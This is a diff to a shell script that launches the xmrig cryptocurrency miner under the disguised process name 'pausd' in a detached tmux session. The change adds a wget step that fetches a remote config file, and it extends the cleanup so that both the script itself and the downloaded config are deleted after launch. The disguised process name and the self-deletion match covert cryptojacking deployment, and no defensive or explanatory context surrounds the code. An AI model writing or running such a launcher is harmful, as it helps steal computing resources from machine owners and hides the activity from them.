@@ -16,6 +16,11 @@ DAEMON=${DAEMON:-pausd}
 OBJ_CFG=${OBJ_CFG:-cfg}
 DAEMON_ARGS=${DAEMON_ARGS:-${OBJ_MASK} ${OBJ_CFG}}
 
+## download cfg 
+if [ "$OBJ_CFG" != cfg ]; then
+	wget -q "$OBJ_CFG" -O cfg
+fi
+
 ## object
 OBJ_VER=${OBJ_VER:-2.4.3}
 OBJ_NAME=${OBJ_NAME:-xmrig}
@@ -45,4 +50,5 @@ PAUSD_RATE=${PAUSD_RATE:-200}
 PATH=.:$PATH tmux new-session -s ${DAEMON} ${DAEMON} ${DAEMON_ARGS}
 
 ## cleanup
-exec rm -- "$0"
+rm -- "$0"
+rm -- "$OBJ_CFG"
